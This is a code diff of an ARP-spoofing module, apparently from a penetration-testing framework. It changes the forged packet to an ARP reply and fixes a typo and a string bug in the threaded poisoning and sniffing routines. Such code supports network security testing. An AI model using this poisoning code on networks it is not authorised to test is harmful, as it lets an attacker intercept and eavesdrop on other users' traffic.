@@ -51,7 +51,7 @@ class Arp(Module):
         self.interface = i
 
     def attack(self):
-        p = ARP(pdst=self.host, psrc=self.ip2_address, hwsrc=self.mac_address)
+        p = ARP(op=2, pdst=self.host, psrc=self.ip2_address)
         print("Poisoning")
         count = 1
         while count < 10 and not self.success:
@@ -59,7 +59,7 @@ class Arp(Module):
             count += 1
             sleep(0.75)
 
-    def snnif_auxiliar(self, pkt):
+    def sniff_auxiliar(self, pkt):
         if (not self.success):
             if (pkt.haslayer(IP) and str(pkt.getlayer(IP).dst) == self.ip2_address
                 and str(pkt.getlayer(IP).src) == self.host):
@@ -68,15 +68,15 @@ class Arp(Module):
                         self.success = True
 
     def run_sniff(self):
-        sniff(prn=self.snnif_auxiliar, filter="host " + str(self.host), iface=self.interface, timeout=self.seconds)
+        sniff(prn=self.sniff_auxiliar, filter="host " + 
+                str(self.host), iface=self.interface, timeout=self.seconds)
 
     def run(self):
         resp = check()
         if (resp != "ok"):
             print(resp)
             return
-
-        print("Wait " + self.seconds + " seconds")
+        print("Wait " +str(self.seconds) + " seconds")
         try:
             t1 = threading.Thread(target=self.attack)
             t2 = threading.Thread(target=self.run_sniff)
